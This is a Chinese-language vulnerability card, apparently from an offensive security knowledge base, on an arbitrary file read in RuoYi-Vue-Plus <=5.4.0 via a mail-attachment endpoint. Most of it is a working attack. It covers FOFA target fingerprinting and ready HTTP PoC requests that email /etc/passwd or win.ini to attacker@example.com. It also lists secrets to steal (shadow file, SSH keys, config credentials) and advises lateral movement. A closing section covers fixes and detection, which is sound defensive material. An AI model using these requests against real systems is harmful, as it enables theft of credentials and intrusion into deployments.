---
id: web-java-framework-ruoyi-vue-plus-sendmessagewithattachment-arbitrary-file-read
title: RuoYi-Vue-Plus <=5.4.0 sendMessageWithAttachment 任意文件读取：filePath 可控附件经邮件外带
type: scenario
domain: web
path: web/java/framework
technique: ruoyi-vue-plus-mail-attachment-arbitrary-file-read
tags:
- java
- ruoyi
- ruoyi-vue-plus
- arbitrary-file-read
- mail
- attachment
- filedatasource
- spring-boot
cve: []
severity: high
confidence: high
status: verified
affected_versions: <=v5.4.0
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V266
  verified_at: '2026-11-07T18:24:07+08:00'
  notes: 已对照原文与全部20张图核对：MailController filePath→new File(图2)、sendText→send 重载(图3-6)、setFiles/FileDataSource.getInputStream(图8-9)、setAttachments DataHandler(图10)、mail.send→doSend→Transport.send→send0→SMTPTransport.sendMessage→message.writeTo→getContentStream(图11-17) 调用链逐段一致；图18请求 filePath=/etc/passwd 返回200操作成功，图19收件箱收到852字节passwd附件；图20修复版移除filePath并硬编码/xxx/xxx。影响版本<=v5.4.0与原文一致。未验证点：原文未说明是否需认证，卡片已注明按案例请求无认证、实际部署需确认；未复跑PoC。
url: /docs/web/java/framework/web-java-framework-ruoyi-vue-plus-sendmessagewithattachment-arbitrary-file-read/
draft: false
kb_aliases:
- RuoYi-Vue-Plus 任意文件读取
- 若依 Plus 文件读取
- sendMessageWithAttachment
- demo/mail/sendMessageWithAttachment
- MailUtils.sendText
- FileDataSource 任意文件读取
---

## 一句话结论

RuoYi-Vue-Plus <=v5.4.0 的 demo 邮件接口 `GET /demo/mail/sendMessageWithAttachment` 把用户可控的 `filePath` 直接 `new File(filePath)` 作为附件交给 JakartaMail；邮件发送时 `FileDataSource.getInputStream()` 会打开该路径并通过 SMTP 把文件作为附件发给攻击者指定的 `to` 邮箱，从而读取 `/etc/passwd`、配置文件、私钥等任意本地文件。

## 原理

- 控制器 `org.dromara.demo.controller.MailController#sendMessageWithAttachment(String to, String subject, String text, String filePath)` 直接执行 `MailUtils.sendText(to, subject, text, new File(filePath))`，`filePath` 完全由请求参数控制，没有路径规范化或白名单。
- `MailUtils.sendText` → `send(...)` → `JakartaMail.setFiles(File...)`：对每个 `File` 创建 `FileDataSource`，再 `setAttachments(DataSource...)`；`setAttachments` 为每个附件创建 `MimeBodyPart` 并 `setDataHandler(new DataHandler(attachment))`，加入 `multipart`。
- `JakartaMail.send()` → `doSend()` → `buildMsg()` → `Transport.send(mimeMessage)` → `SMTPTransport.sendMessage()` → `message.writeTo(os)`；写 MIME 时 `MimeBodyPart.writeTo()` 调用 `getContentStream()`，最终由 `FileDataSource.getInputStream()` 执行 `new FileInputStream(this._file)`，真实读取攻击者指定路径的文件字节。
- 读取到的文件内容被编码进 MIME 附件，随 SMTP 邮件发送到 `to` 指定的收件人；攻击者使用自己的邮箱即可拿到文件。案例把 `/etc/passwd` 作为附件成功收到（852 字节，内容为 passwd）。
- 该漏洞不是路径穿越，而是“功能设计允许把任意本地路径作为邮件附件”；即使不穿越 `..`，绝对路径也能直接读取。是否可未授权利用取决于部署是否暴露 demo 模块/网关鉴权；案例请求未带认证且返回 `{"code":200,"msg":"操作成功"}`。

## 触发条件

- 目标为 RuoYi-Vue-Plus <= v5.4.0，且 demo 模块的 `MailController`/`/demo/mail/sendMessageWithAttachment` 可访问（未删 demo、未被网关拦截）。
- 系统已配置可用的邮件账户/SMTP（否则邮件发送失败，文件读取不可回传；可能只形成盲读）。
- 攻击者能指定 `to` 为自己的邮箱，并能访问对应邮件服务器。
- 接口无需认证或攻击者已有可用会话（案例未带认证直接 200，实际部署需确认鉴权策略）。

## 利用步骤

1. 指纹识别：FOFA `body="RuoYi-Vue-Plus后台管理框架"`，或访问登录页/响应特征确认产品。
2. 确认接口存在：访问 `/demo/mail/sendMessageWithAttachment`，观察是否返回 200/邮件发送结果。
3. 指定收件人为自己的邮箱，`filePath` 填目标文件绝对路径：
   ```http
   GET /demo/mail/sendMessageWithAttachment?to=attacker@example.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
   Host: target:8080
   ```
4. 登录收件邮箱查收附件，确认可读取文件；Linux 可读 `/etc/passwd`、`/etc/shadow`（权限允许时）、`~/.ssh/id_rsa`、应用 `application.yml`/`bootstrap.yml`、数据库配置、日志等；Windows 可读 `C:\Windows\win.ini`、配置文件、凭据文件。
5. 根据读到的凭据/配置进一步横向或提权；测试后清理邮件与附件。

## PoC

```http
GET /demo/mail/sendMessageWithAttachment?to=attacker%40example.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
Host: target:8080
```

```text
响应：HTTP/1.1 200 OK
{"code":200,"msg":"操作成功","data":null}

收件邮箱：附件 passwd（852 字节），内容为 /etc/passwd 的 root:x:0:0:... 等条目。
```

Windows 目标示例：

```http
GET /demo/mail/sendMessageWithAttachment?to=attacker%40example.com&subject=t&text=t&filePath=C:\Windows\win.ini HTTP/1.1
```

## 变体与关联

- 与 RuoYi 4.5.0 `/common/download/resource` 路径穿越（`web-java-framework-ruoyi-download-resource-path-traversal`）不同：本条是 RuoYi-Vue-Plus 的邮件附件功能，绝对路径直接读取并经 SMTP 外带，不依赖 `..` 穿越，也不直接回显 HTTP 响应。
- 邮件发送失败时为盲读：可改用内网可达的 SMTP/收件箱，或读取能通过错误信息/时序判断的文件。
- 其他 RuoYi 系文件读取/下载接口可复用同样思路；重点审计所有 `new File(userInput)` / `FileInputStream(userInput)` / 附件下载参数。
- 修复版本把 `filePath` 参数移除并硬编码附件路径（`new File("/xxx/xxx")`），升级后该接口不再可控。

## 检测与防御

- 升级到 > v5.4.0 的修复版本；生产环境删除 demo 模块或至少禁止 `/demo/**` 暴露到外网。
- 对邮件附件路径使用固定目录/白名单 + `Path.normalize()`/`toRealPath()` 校验，禁止绝对路径与 `..`；不要把用户输入直接传给 `FileDataSource`/`FileInputStream`。
- 接口增加认证与权限控制，限制 `to` 域名；关闭不必要的邮件发送功能。
- 监控带系统文件（`/etc/passwd`、`win.ini`、`id_rsa`、`application.yml` 等）附件的出站 SMTP 邮件；WAF 拦截 `filePath` 为绝对路径或含 `..` 的请求。
- 日志审计 `/demo/mail/sendMessageWithAttachment` 的异常收件人与 filePath 参数。
